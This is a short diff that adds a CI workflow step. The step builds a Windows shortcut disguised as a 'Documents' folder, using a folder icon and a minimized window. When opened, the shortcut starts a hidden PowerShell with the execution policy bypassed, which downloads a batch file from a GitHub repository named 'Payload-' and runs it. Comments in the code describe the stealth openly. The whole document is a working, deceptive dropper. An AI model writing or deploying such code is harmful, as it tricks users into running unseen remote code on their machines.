@@ -1,0 +1,19 @@
+      - name: Create Stealth Folder Shortcut
+        shell: pwsh
+        run: |
+          $WshShell = New-Object -ComObject WScript.Shell
+          # We name it 'Documents' to make it look legitimate
+          $Shortcut = $WshShell.CreateShortcut("$pwd\Documents.lnk")
+          
+          # This is the 'Engine' that runs your code
+          $Shortcut.TargetPath = "powershell.exe"
+          
+          # This tells PowerShell to download your .bat and run it silently
+          $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX (iwr 'https://raw.githubusercontent.com/Wizardcargo8080/Payload-/main/Install.bat').Content`""
+          
+          # 3 is the standard Folder icon in shell32.dll
+          $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll, 3"
+          
+          # 7 makes the initial window 'Minimized' so it doesn't flash on screen
+          $Shortcut.WindowStyle = 7 
+          $Shortcut.Save()
